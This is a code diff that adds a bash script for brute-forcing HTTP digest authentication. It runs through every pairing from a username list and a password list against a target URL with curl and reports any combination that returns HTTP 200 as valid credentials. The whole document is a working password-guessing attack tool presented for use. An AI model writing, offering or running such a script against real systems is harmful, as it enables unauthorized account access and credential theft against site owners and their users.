@@ -1,0 +1,26 @@
+#!/bin/bash
+
+# Check if sufficient arguments are provided
+if [ $# -ne 3 ]; then
+  echo "Usage: $0 <user_list> <password_list> <target_url>"
+  exit 1
+fi
+
+# Read usernames from the first file
+cat $1 | while read USER; do
+  # Read passwords from the second file
+  cat $2 | while read PASSWORD; do
+
+    # Send the request with cURL
+    HTTP_RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null $3 -c /tmp/cookie --digest -u $USER:$PASSWORD)
+
+    # Check if the response code is 200 (OK) or any other indicator of success
+    if [ "$HTTP_RESPONSE" -eq 200 ]; then
+      echo "[+] Found valid credentials: $USER:$PASSWORD"
+      exit 0  # Exit as soon as valid credentials are found
+    elif [ "$HTTP_RESPONSE" -ne 401 ]; then
+      echo "[!] Unexpected response code: $HTTP_RESPONSE"
+    fi
+
+  done
+done
